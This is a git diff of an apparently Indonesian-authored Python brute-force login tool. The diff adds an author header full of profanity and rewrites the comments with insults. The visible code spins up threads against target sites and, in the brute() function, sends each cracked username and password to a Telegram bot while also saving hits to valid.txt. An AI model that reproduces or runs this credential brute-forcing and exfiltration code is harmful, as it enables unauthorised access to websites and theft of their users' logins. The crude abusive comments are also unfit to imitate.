@@ -1,10 +1,15 @@
+#ini tools kadang error ya jancok, kalo yg powerfull private lh kontol
+#Recode fitur boleh author ga usah di ubah ya anjing lu 
+#author: X'Boy Linux 
+#Team : Foursdeath team 
+
 import requests, threading, sys, os, random
 import time, sys, itertools
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, Style, init
 from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor
-# Fungsi untuk kirim pesan ke Telegram
+# yahaha
 def kirim_telegram(pesan):
     token = "TOKEN_ID"
     chat_id = "CHAT_ID"
@@ -79,13 +84,13 @@ footer = (
     Fore.YELLOW + "     proxy: " + Fore.LIGHTWHITE_EX + "none".ljust(30) +
     Fore.RESET + "result: " + Fore.LIGHTYELLOW_EX + "valid.txt"
 )
-# Tampilkan efek loading
+# loading
 loading_spinner("Memulai X'Boy Linux Engine", 1)
 
-# Efek ASCII salju
+# cuki effect 
 snow_effect(ascii_art)
 
-# Footer bold
+# Footer 
 print("\n" + footer + "\n")
 
 
@@ -163,7 +168,7 @@ def brute(site):
                                  f"👤 Username: `{user}`\n"
                                  f"🔑 Password: `{pwd}`"
                         )
-                        kirim_telegram(pesan)  # Kirim ke Telegram langsung saat success
+                        kirim_telegram(pesan)  # Kirim ke bapak kau
                         found.append(site)
                         found.append(site)
                     return
